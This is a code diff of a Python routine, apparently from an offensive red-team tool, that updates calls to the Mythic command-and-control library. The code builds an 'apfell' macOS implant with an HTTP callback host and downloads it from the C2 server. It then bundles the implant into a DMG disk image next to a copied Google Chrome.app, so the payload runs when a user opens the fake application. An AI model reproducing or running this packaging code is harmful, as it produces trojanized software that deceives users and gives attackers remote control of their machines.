@@ -33,7 +33,7 @@ def dmg():
 
     ## Create apfell payload
     async def scripting():
-        mythic = Mythic(
+        mythic = mythic_rest.Mythic(
             username=mythic_username,
             password=mythic_password,
             server_ip=mythic_server_ip,
@@ -45,15 +45,16 @@ def dmg():
         await mythic.login()
         await mythic.set_or_create_apitoken()
         # define what our payload should be
-        p = Payload(
+        p = mythic_rest.Payload(
             payload_type="apfell", 
             c2_profiles={
-                "HTTP":[
+                "http":[
                         {"name": "callback_host", "value": mythic_http_callback_host},
                         {"name": "callback_interval", "value": mythic_http_callback_interval}
                     ]
                 },
             tag="Disk Image",
+            selected_os="macOS",
             # if we want to only include specific commands, put them here:
             #commands=["cmd1", "cmd2", "cmd3"],
             filename="Disk_Image.js")
@@ -63,7 +64,7 @@ def dmg():
         resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)
 
         print("[*] Building DMG Package Payload")
-        payloadDownloadid = resp.response.file_id.agent_file_id
+        payloadDownloadid = resp.response.file["agent_file_id"]
 
         url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid
         copyanything("/Applications/Google Chrome.app" , payload + "/Chrome.app") 
@@ -86,7 +87,7 @@ def dmg():
               "2) Payload execution does not occur until the user runs the application (not just installation)")
         try:
             while True:
-                pending = asyncio.all_tasks()
+                pending = mythic_rest.asyncio.all_tasks()
                 plist = []
                 for p in pending:
                     if p._coro.__name__ != "main" and p._state == "PENDING":
@@ -94,11 +95,11 @@ def dmg():
                 if len(plist) == 0:
                     exit(0)
                 else:
-                    await asyncio.gather(*plist)
+                    await mythic_rest.asyncio.gather(*plist)
         except KeyboardInterrupt:
-            pending = asyncio.all_tasks()
+            pending = mythic_rest.asyncio.all_tasks()
             for t in pending:
                 t.cancel()    
 
-    loop = asyncio.get_event_loop()
+    loop = mythic_rest.asyncio.get_event_loop()
     loop.run_until_complete(main())
